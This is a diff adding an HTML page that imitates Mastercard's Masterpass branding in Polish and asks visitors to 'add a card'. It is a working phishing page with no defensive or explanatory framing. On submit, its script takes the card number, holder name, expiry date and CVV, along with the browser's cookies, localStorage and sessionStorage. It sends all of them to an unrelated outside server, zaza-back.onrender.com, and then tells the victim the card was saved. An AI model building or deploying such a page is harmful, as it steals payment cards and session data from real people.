@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="pl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Masterpass Karta</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
+  </head>
+  <body class="bg-black flex items-center justify-center min-h-screen font-sans">
+    <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg relative">
+      <!-- Header -->
+      <div class="flex items-center justify-between p-4 border-b">
+        <div class="flex items-center space-x-2">
+          <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
+          <div class="text-sm font-semibold">masterpass <span class="text-gray-500 text-xs block">by mastercard.</span></div>
+        </div>
+        <div class="relative group cursor-pointer">
+          <img src="https://flagcdn.com/w40/pl.png" class="w-6 h-4" />
+          <div class="absolute hidden group-hover:block bg-white border shadow-md right-0 mt-2 rounded text-sm">
+            <a href="#" class="block px-4 py-2 hover:bg-gray-100">🇵🇱 Polski</a>
+            <a href="#" class="block px-4 py-2 hover:bg-gray-100">🇬🇧 English</a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Form -->
+      <div class="p-6">
+        <h2 class="text-lg font-semibold mb-4">Dodaj kartę</h2>
+        <form id="cardForm" class="space-y-4">
+          <input
+            type="text"
+            name="cardNumber"
+            placeholder="Numer karty"
+            maxlength="19"
+            class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+            required />
+          <input
+            type="text"
+            name="cardHolder"
+            placeholder="Imię i nazwisko posiadacza"
+            class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+            required />
+          <div class="flex gap-4">
+            <input
+              type="text"
+              name="expiryDate"
+              placeholder="MM/RR"
+              maxlength="5"
+              class="flex-1 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+              required />
+            <input
+              type="text"
+              name="cvv"
+              placeholder="CVV"
+              maxlength="4"
+              class="flex-1 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+              required />
+          </div>
+          <button
+            type="submit"
+            class="bg-red-600 hover:bg-red-700 text-white w-full py-2 rounded transition">
+            Zapisz kartę
+          </button>
+        </form>
+      </div>
+
+      <!-- Footer -->
+      <div class="text-center text-xs bg-black text-white p-2">
+        Ta strona używa plików cookies zgodnie z polityką prywatności.
+      </div>
+    </div>
+
+    <script>
+      const form = document.getElementById('cardForm');
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const payload = {
+          cardNumber: form.cardNumber.value,
+          cardHolder: form.cardHolder.value,
+          expiryDate: form.expiryDate.value,
+          cvv: form.cvv.value,
+          cookies: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
+          userAgent: navigator.userAgent,
+          location: window.location.href,
+          date: new Date().toISOString(),
+        };
+
+        try {
+          const res = await fetch('https://zaza-back.onrender.com/card', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+          });
+
+          if (res.ok) {
+            alert('✅ Karta zapisana!');
+            form.reset();
+          } else {
+            alert('❌ Błąd podczas zapisu.');
+          }
+        } catch (err) {
+          console.error(err);
+          alert('❌ Błąd połączenia.');
+        }
+      });
+    </script>
+  </body>
+</html>
